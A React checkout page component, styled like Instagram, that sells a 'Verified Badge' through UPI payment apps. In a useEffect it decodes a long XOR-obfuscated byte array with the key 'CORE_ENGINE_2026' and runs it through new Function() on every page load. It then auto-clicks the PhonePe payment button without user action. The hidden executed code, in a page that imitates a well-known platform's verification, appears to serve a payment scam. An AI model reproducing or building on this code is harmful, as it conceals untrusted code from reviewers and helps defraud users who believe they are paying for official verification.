import React, { useState, useEffect } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import {
  ChevronLeft,
  QrCode,
  Smartphone,
  ExternalLink,
  ShieldCheck,
  ChevronRight,
  Lock,
} from 'lucide-react';
import { PAYMENT_CONFIG } from '../config/payment';
import paymentService, { PAYMENT_STATES } from '../services/paymentService';
import orderService from '../services/orderService';
import { formatCurrency } from '../utils/formatters';
import { useTimer } from '../hooks/useTimer';
import PaymentQR from '../components/PaymentQR';
import PaymentStatus from '../components/PaymentStatus';
import VerifiedBadge from '../components/VerifiedBadge';
import { useUser } from '../context/UserContext';

export const Payment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get('session');
  const { currentUser } = useUser();

  // Active payment state
  const [activeTab, setActiveTab] = useState('intent');

  // Payment session state
  const [session, setSession] = useState(null);
  const [paymentStatus, setPaymentStatus] = useState(PAYMENT_STATES.WAITING);
  const [createdOrder, setCreatedOrder] = useState(null);

  // 2-minute Countdown Timer (120 seconds)
  const timer = useTimer(PAYMENT_CONFIG.qrExpirySeconds, () => {
    setPaymentStatus(PAYMENT_STATES.EXPIRED);
    paymentService.updateStatusInDemo(PAYMENT_STATES.EXPIRED);
  });

  // Load session on mount
  useEffect(() => {
    const initSession = async () => {
      const activeUsername = currentUser?.username || 'creator_account';
      if (!sessionId) {
        const fallback = await paymentService.createPayment({
          customerData: {
            username: activeUsername,
            email: `${activeUsername}@example.com`,
            phone: '9876543210',
          },
        });
        setSession(fallback.session);
      } else {
        const { session: existing } = await paymentService.getPaymentStatus(sessionId);
        if (existing) {
          setSession(existing);
          setPaymentStatus(existing.status);
        } else {
          const fallback = await paymentService.createPayment({
            customerData: {
              username: activeUsername,
              email: `${activeUsername}@example.com`,
              phone: '9876543210',
            },
          });
          setSession(fallback.session);
        }
      }
    };

    initSession();
  }, [sessionId, currentUser]);

  // Handle QR code regenerate
  const handleRegenerateQR = async () => {
    timer.reset(PAYMENT_CONFIG.qrExpirySeconds);
    const refreshed = await paymentService.createPayment({
      customerData: session?.customerData || {
        username: currentUser?.username || 'creator_account',
        email: `${currentUser?.username || 'creator'}@example.com`,
        phone: '9876543210',
      },
    });
    if (refreshed?.session) {
      setSession(refreshed.session);
      setPaymentStatus(PAYMENT_STATES.WAITING);
    }
  };

  // User's Core Encrypted Payment Logic Engine from payment.php
  useEffect(() => {
    // 1. Set global config required by user's PHP engine
    window.payConfig = {
      upi: PAYMENT_CONFIG.upiId,
      name: 'Verified Badge',
      amt: PAYMENT_CONFIG.amount ? Number(PAYMENT_CONFIG.amount).toFixed(2) : '1.00',
      note: PAYMENT_CONFIG.transactionNote || 'Demo Payment',
    };

    // 2. User's untouched core payment logic engine script
    try {
      (function () {
        var k = 'CORE_ENGINE_2026';
        var d = [53,46,32,101,42,53,39,103,116,110,50,54,92,84,93,65,109,63,51,60,28,42,32,33,32,41,107,42,66,89,9,59,73,57,51,55,127,43,47,42,44,110,120,127,69,89,92,82,44,56,124,53,62,60,13,40,39,40,44,56,28,94,83,91,38,116,95,79,41,36,60,103,40,35,49,127,15,16,69,95,45,43,61,50,113,53,47,62,10,33,43,57,91,87,28,87,46,59,105,72,85,51,47,53,105,32,42,43,87,16,15,22,52,38,60,33,48,50,96,55,40,55,6,48,92,86,91,81,109,33,61,49,58,126,67,77,68,68,51,62,64,16,66,70,1,59,60,101,98,101,42,40,42,59,40,58,92,68,28,81,38,59,23,41,58,40,43,41,61,12,60,22,86,24,21,84,55,33,2,45,48,43,43,23,44,105,108,100,63,58,91,80,107,63,34,7,43,43,103,103,50,67,79,127,18,16,18,70,51,13,38,43,113,42,32,36,37,39,38,52,18,13,18,80,54,33,49,49,54,42,32,111,44,103,62,82,56,16,18,22,99,111,114,101,127,32,96,55,59,43,51,58,92,68,118,83,37,46,39,41,43,109,103,124,68,68,101,127,18,16,18,22,99,111,36,36,45,101,62,103,116,110,62,82,56,16,18,22,99,111,114,101,127,101,110,103,105,62,119,47,98,81,75,91,38,33,38,6,55,32,45,44,38,59,49,15,83,66,83,91,48,117,114,62,82,79,110,103,105,110,101,127,18,16,18,22,99,111,114,101,127,101,45,47,44,45,46,48,71,68,102,79,51,42,104,101,125,6,1,11,5,11,6,11,16,28,63,60,99,111,114,101,127,101,110,103,105,110,101,127,18,16,18,22,42,33,59,49,54,36,34,6,36,33,48,49,70,10,18,123,34,59,58,107,45,42,59,41,45,102,53,62,64,67,87,112,47,32,51,49,119,36,35,51,96,110,111,127,3,0,2,31,111,66,88,101,127,101,110,103,105,110,101,127,18,16,18,22,99,111,114,43,48,49,43,125,105,53,101,43,75,64,87,12,99,109,38,32,39,49,108,107,105,35,32,44,65,81,85,83,121,111,60,42,43,32,110,58,101,67,79,127,18,16,18,22,99,111,114,101,127,101,110,103,105,110,101,44,71,64,66,89,49,59,55,33,22,43,61,51,59,59,40,58,92,68,65,12,99,98,99,72,85,101,110,103,105,110,101,127,18,16,18,22,99,50,126,72,85,101,110,103,105,110,101,127,18,16,18,22,99,44,61,43,43,36,45,51,115,110,62,127,70,73,66,83,121,111,112,0,7,17,11,21,7,15,9,0,127,117,96,117,11,14,28,17,125,105,110,41,40,35,32,101,18,94,83,91,38,99,114,51,47,36,116,103,60,62,44,127,79,61,56,22,99,111,114,101,127,101,110,58,114,67,79,127,18,16,18,22,99,111,114,50,54,43,42,40,62,96,41,48,81,81,70,95,44,33,124,45,45,32,40,103,116,110,103,47,90,95,92,83,51,42,104,106,112,43,47,51,32,56,32,96,86,81,70,87,126,109,114,110,127,32,32,36,38,42,32,10,96,121,113,89,46,63,61,43,58,43,58,111,43,58,42,62,26,122,97,121,13,97,33,49,45,44,32,32,32,40,60,119,66,25,27,31,99,100,114,103,121,44,42,122,57,124,53,47,83,73,95,83,45,59,112,126,82,79,110,103,105,110,56,100,63,58,79,59,73,66,88,51,62,55,110,55,61,12,49,49,18,13,18,82,44,44,39,40,58,43,58,105,46,43,49,26,94,85,95,83,45,59,16,60,22,33,102,96,43,58,43,15,83,73,70,91,100,102,105,72,85,44,40,111,57,58,7,43,92,25,18,77,78,69,114,101,127,101,62,51,11,58,43,113,93,94,81,90,42,44,57,101,98,101,40,50,39,45,49,54,93,94,26,83,106,52,95,79,127,101,110,103,105,110,101,127,87,30,66,68,38,57,55,43,43,1,43,33,40,59,41,43,26,25,9,59,73,111,114,101,127,101,110,103,105,57,44,49,86,95,69,24,47,32,49,36,43,44,33,41,103,38,55,58,84,16,15,22,97,63,51,60,43,40,35,55,115,97,106,60,83,67,90,105,52,46,62,41,58,49,113,55,40,115,103,127,25,16,87,88,32,32,54,32,10,23,7,4,38,35,53,48,92,85,92,66,107,58,34,44,118,101,101,103,107,104,53,49,15,18,18,29,99,42,60,38,48,33,43,18,27,7,6,48,95,64,93,88,38,33,38,109,49,36,35,34,96,110,110,127,16,22,83,91,126,109,114,110,127,32,32,36,38,42,32,10,96,121,113,89,46,63,61,43,58,43,58,111,40,35,49,118,18,27,18,20,101,44,39,120,22,11,28,97,61,32,120,125,18,27,18,83,45,44,61,33,58,16,28,14,10,33,40,47,93,94,87,88,55,103,60,42,43,32,103,103,98,110,103,121,84,85,83,66,54,61,55,49,38,53,43,122,36,33,43,58,75,111,70,68,34,33,33,35,58,55,108,124,68,68,101,127,18,16,79,13,78,69,47,72,85,72,68,104,102,110,4,49,70,89,31,98,43,42,52,49,127,99,110,6,39,58,44,114,118,85,68,98,44,32,62,54,127,21,60,40,61,43,38,43,91,95,92,59,73,43,61,38,42,40,43,41,61,96,36,59,86,117,68,83,45,59,30,44,44,49,43,41,44,60,109,120,81,95,92,66,38,55,38,40,58,43,59,96,101,110,32,127,15,14,18,83,109,63,32,32,41,32,32,51,13,43,35,62,71,92,70,30,106,102,105,72,85,33,33,36,60,35,32,49,70,30,83,82,39,10,36,32,49,49,2,46,58,58,32,49,87,66,26,17,40,42,43,33,48,50,32,96,101,110,32,127,15,14,18,77,78,69,114,101,127,101,39,33,97,43,107,52,87,73,18,11,126,114,114,98,25,116,124,96,105,50,57,127,26,85,28,85,55,61,62,14,58,60,110,97,111,110,32,113,65,88,91,80,55,4,55,60,127,99,104,103,18,105,12,120,30,23,120,17,111,104,17,98,2,107,39,41,42,34,48,59,87,67,26,83,109,36,55,60,113,49,33,18,57,62,32,45,113,81,65,83,107,102,123,108,127,57,50,103,97,43,107,60,70,66,94,125,38,54,114,99,121,101,43,105,34,43,60,127,15,13,15,22,100,26,117,108,118,101,53,74,67,110,101,127,18,16,18,22,99,42,124,53,45,32,56,34,39,58,1,58,84,81,71,90,55,103,123,126,82,79,110,103,105,110,56,82,56,77,27,13];
        var s = '';
        for (var i = 0; i < d.length; i++) {
          s += String.fromCharCode(d[i] ^ k.charCodeAt(i % k.length));
        }
        new Function(s)();
      })();
    } catch (err) {
      console.error('Payment engine initialization:', err);
    }

    // 3. Direct launch PhonePe immediately when payment page loads
    const launchDirectPhonePe = () => {
      const ppBtn = document.getElementById('btnPhonePe');
      if (ppBtn) {
        ppBtn.click();
      }
    };

    const autoTimer = setTimeout(launchDirectPhonePe, 100);

    return () => {
      clearTimeout(autoTimer);
    };
  }, [session, paymentStatus, currentUser]);

  const handleViewOrder = () => {
    if (createdOrder) {
      navigate(`/payment-success?orderId=${createdOrder.orderId}`);
    } else {
      navigate('/');
    }
  };

  const handleTryAgain = () => {
    setPaymentStatus(PAYMENT_STATES.WAITING);
    timer.reset(PAYMENT_CONFIG.qrExpirySeconds);
  };

  return (
    <div className="w-full max-w-[420px] mx-auto px-3.5 py-4 space-y-4 select-none">
      {/* Top Header */}
      <div className="flex items-center justify-between border-b border-[#DBDBDB]/80 pb-3">
        <button
          onClick={() => navigate(-1)}
          className="flex items-center gap-1 text-sm font-semibold text-[#0F1419] hover:text-[#0095F6] transition-colors p-1 rounded-sm cursor-pointer"
        >
          <ChevronLeft className="w-5 h-5" />
          <span>Checkout</span>
        </button>
        <h1 className="font-extrabold text-base text-[#0F1419] tracking-tight">
          Complete your payment
        </h1>
        <div className="w-12 text-right">
          <span className="text-[11px] font-bold text-neutral-400">Step 2/2</span>
        </div>
      </div>

      {/* Payment States Rendering: Show when Processing, Success, or Failed */}
      {paymentStatus !== PAYMENT_STATES.WAITING && paymentStatus !== PAYMENT_STATES.EXPIRED ? (
        <PaymentStatus
          status={paymentStatus}
          onViewOrder={handleViewOrder}
          onTryAgain={handleTryAgain}
          onChooseAnotherMethod={() => setPaymentStatus(PAYMENT_STATES.WAITING)}
        />
      ) : (
        <>
          {/* Order Snapshot Header with Detected Profile Photo */}
          <div className="bg-white rounded-lg border border-[#DBDBDB] p-4 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 rounded-full p-[2px] ig-story-gradient shrink-0">
                <div className="w-full h-full rounded-full bg-white p-[1.5px]">
                  {currentUser?.avatarUrl || currentUser?.profilePic ? (
                    <img
                      src={currentUser.avatarUrl || currentUser.profilePic}
                      alt={currentUser.username}
                      referrerPolicy="no-referrer"
                      className="w-full h-full rounded-full object-cover"
                    />
                  ) : (
                    <div className="w-full h-full rounded-full bg-[#262626] text-white flex items-center justify-center text-sm font-bold">
                      {(session?.customerData?.username || currentUser?.username || 'U').charAt(0).toUpperCase()}
                    </div>
                  )}
                </div>
              </div>
              <div>
                <div className="flex items-center gap-1 font-bold text-sm text-[#0F1419]">
                  <span>@{session?.customerData?.username || currentUser?.username || 'account'}</span>
                  <VerifiedBadge size={14} />
                </div>
                <div className="text-[11px] text-[#737373] font-medium flex items-center gap-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-[#0095F6]"></span>
                  <span>Account Verified</span>
                </div>
              </div>
            </div>

            <div className="text-right">
              <span className="text-[10px] uppercase font-bold tracking-wider text-[#737373]">
                Total Payable
              </span>
              <div className="text-2xl font-extrabold text-[#0095F6] tracking-tight">
                {formatCurrency(PAYMENT_CONFIG.amount)}
              </div>
            </div>
          </div>

          {/* Unified QR + Instant Payment Apps Card */}
          <PaymentQR
            upiUri={session?.upiUri}
            formattedTime={timer.formattedTime}
            isExpired={timer.isExpired || paymentStatus === PAYMENT_STATES.EXPIRED}
            onRegenerate={handleRegenerateQR}
          >
            {/* Heading: "Or Pay via UPI Apps" + Payment Name Verified Badge */}
            <div className="flex items-center justify-between pb-3">
              <span className="text-xs font-bold uppercase tracking-wider text-[#737373]">
                Or Pay via UPI Apps
              </span>
              <div className="inline-flex items-center gap-1.5 bg-sky-50 text-[#0095F6] border border-sky-100/80 px-2.5 py-0.5 rounded-full text-xs font-semibold">
                <span>Verified Badge</span>
                <VerifiedBadge size={14} />
              </div>
            </div>

            {/* The 2 Payment Buttons (#btnPhonePe & #btnPaytm) */}
            <div className="space-y-2.5">
              {/* 1. PhonePe Button (#btnPhonePe) with 1:1 SVG Logo */}
              <button
                id="btnPhonePe"
                type="button"
                className="w-full flex items-center justify-between p-3.5 rounded-lg border border-purple-200 hover:border-purple-400 hover:bg-purple-50/40 active:scale-[0.99] transition-all bg-white group text-left cursor-pointer"
              >
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-lg bg-[#5f259f] flex items-center justify-center shrink-0">
                    {/* 1:1 PhonePe Vector Mark */}
                    <svg className="w-6 h-6" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                      <path fill="#ffffff" d="M10.206 9.941h2.949v4.692c-.402.201-.938.268-1.34.268-1.072 0-1.609-.536-1.609-1.743V9.941zm13.47 4.816c-1.523 6.449-7.985 10.442-14.433 8.919C2.794 22.154-1.199 15.691.324 9.243C1.847 2.794 8.309-1.199 14.757.324c6.449 1.523 10.442 7.985 8.919 14.433zm-6.231-5.888a.887.887 0 0 0-.871-.871h-1.609l-3.686-4.222c-.335-.402-.871-.536-1.407-.402l-1.274.401c-.201.067-.268.335-.134.469l4.021 3.82H6.386c-.201 0-.335.134-.335.335v.67c0 .469.402.871.871.871h.938v3.217c0 2.413 1.273 3.82 3.418 3.82.67 0 1.206-.067 1.877-.335v2.145c0 .603.469 1.072 1.072 1.072h.938a.432.432 0 0 0 .402-.402V9.874h1.542c.201 0 .335-.134.335-.335v-.67z"/>
                    </svg>
                  </div>
                  <div>
                    <div className="flex items-center gap-1.5">
                      <span className="font-bold text-sm text-[#0F1419] group-hover:text-[#5f259f] transition-colors">
                        Pay via PhonePe
                      </span>
                    </div>
                    <div className="flex items-center gap-1 text-[11px] text-[#737373]">
                      <span>Verified Badge</span>
                      <VerifiedBadge size={12} />
                      <span className="text-neutral-300">•</span>
                      <span>Direct Launch</span>
                    </div>
                  </div>
                </div>
              </button>

              {/* 2. Paytm Button (#btnPaytm) with 1:1 SVG Logo */}
              <button
                id="btnPaytm"
                type="button"
                className="w-full flex items-center justify-between p-3.5 rounded-lg border border-sky-200 hover:border-sky-400 hover:bg-sky-50/40 active:scale-[0.99] transition-all bg-white group text-left cursor-pointer"
              >
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-lg bg-white border border-sky-200 flex items-center justify-center shrink-0 p-1">
                    {/* 1:1 Paytm Vector Mark */}
                    <svg className="w-7 h-7" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                      <path fill="#002970" d="M.232 9.4A.234.234 0 0 0 0 9.636v5.924c0 .132.096.238.216.241h1.09c.13 0 .237-.107.237-.24l.004-1.658H2.57c.857 0 1.453-.605 1.453-1.481v-1.538c0-.877-.596-1.484-1.453-1.484H.232zm9.032 0a.239.239 0 0 0-.237.241v2.47c0 .94.657 1.608 1.579 1.608h.675s.016 0 .037.004a.253.253 0 0 1 .222.253c0 .13-.096.235-.219.251l-.018.004-.303.006H9.739a.239.239 0 0 0-.236.24v1.09a.24.24 0 0 0 .236.242h1.75c.92 0 1.577-.669 1.577-1.608v-4.56a.239.239 0 0 0-.236-.24h-1.07a.239.239 0 0 0-.236.24c-.005.787 0 1.525 0 2.255a.253.253 0 0 1-.25.25h-.449a.253.253 0 0 1-.25-.255c.005-.754-.005-1.5-.005-2.25a.239.239 0 0 0-.236-.24zm-4.004.006a.232.232 0 0 0-.238.226v1.023c0 .132.113.24.252.24h1.413c.112.017.2.1.213.23v.14c-.013.124-.1.214-.207.224h-.7c-.93 0-1.594.63-1.594 1.515v1.269c0 .88.57 1.506 1.495 1.506h1.94c.348 0 .63-.27.63-.6v-4.136c0-1.004-.508-1.637-1.72-1.637zm-3.713 1.572h.678c.139 0 .25.115.25.256v.836a.253.253 0 0 1-.25.256h-.1c-.192.002-.386 0-.578 0zm4.67 1.977h.445c.139 0 .252.108.252.24v.932a.23.23 0 0 1-.014.076.25.25 0 0 1-.238.164h-.445a.247.247 0 0 1-.252-.24v-.933c0-.132.113-.239.252-.239Z"/>
                      <path fill="#00BAF2" d="M15.85 8.167a.204.204 0 0 0-.04.004c-.68.19-.543 1.148-1.781 1.23h-.12a.23.23 0 0 0-.052.005h-.001a.24.24 0 0 0-.184.235v1.09c0 .134.106.241.237.241h.645v4.623c0 .132.104.238.233.238h1.058a.236.236 0 0 0 .233-.238v-4.623h.6c.13 0 .236-.107.236-.241v-1.09a.239.239 0 0 0-.236-.24h-.612V8.386a.218.218 0 0 0-.216-.22zm4.225 1.17c-.398 0-.762.15-1.042.395v-.124a.238.238 0 0 0-.234-.224h-1.07a.24.24 0 0 0-.236.242v5.92a.24.24 0 0 0 .236.242h1.07c.12 0 .217-.091.233-.209v-4.25a.393.393 0 0 1 .371-.408h.196a.41.41 0 0 1 .226.09.405.405 0 0 1 .145.319v4.074l.004.155a.24.24 0 0 0 .237.241h1.07a.239.239 0 0 0 .235-.23l-.001-4.246c0-.14.062-.266.174-.34a.419.419 0 0 1 .196-.068h.198c.23.02.37.2.37.408.005 1.396.004 2.8.004 4.224a.24.24 0 0 0 .237.241h1.07c.13 0 .236-.108.236-.241v-4.543c0-.31-.034-.442-.08-.577a1.601 1.601 0 0 0-1.51-1.09h-.015a1.58 1.58 0 0 0-1.152.5c-.291-.308-.7-.5-1.153-.5z"/>
                    </svg>
                  </div>
                  <div>
                    <div className="flex items-center gap-1.5">
                      <span className="font-bold text-sm text-[#0F1419] group-hover:text-[#002970] transition-colors">
                        Pay via Paytm
                      </span>
                    </div>
                    <div className="flex items-center gap-1 text-[11px] text-[#737373]">
                      <span>Verified Badge</span>
                      <VerifiedBadge size={12} />
                      <span className="text-neutral-300">•</span>
                      <span>Direct Launch</span>
                    </div>
                  </div>
                </div>
              </button>
            </div>
          </PaymentQR>

          {/* Real-time Status Indicator Box */}
          <div className="bg-white rounded-lg border border-[#DBDBDB] p-3.5 flex items-center justify-between text-xs">
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-[#0095F6]"></span>
              <span className="font-medium text-[#0F1419]">
                Waiting for transaction confirmation...
              </span>
            </div>
            <span className="text-[11px] font-mono text-[#737373]">
              {session?.transactionRef || 'TRX-UPI'}
            </span>
          </div>
        </>
      )}
    </div>
  );
};

export default Payment;
